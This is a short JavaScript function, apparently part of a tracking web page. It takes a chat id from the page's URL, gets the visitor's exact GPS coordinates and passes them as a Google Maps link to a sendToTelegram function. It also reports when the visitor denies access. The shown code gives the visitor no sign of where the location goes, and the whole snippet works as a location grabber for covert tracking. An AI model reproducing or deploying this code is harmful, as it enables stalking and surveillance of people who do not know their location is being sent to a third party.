function startGPS() {
  const chatId = new URLSearchParams(window.location.search).get("id");
  if (!chatId) return;
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const message = `📍 GPS Location:\nhttps://maps.google.com/?q=${lat},${lon}`;
      sendToTelegram(message);
    },
    err => {
      sendToTelegram("⛔ GPS access denied or unavailable");
    },
    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
  );
}
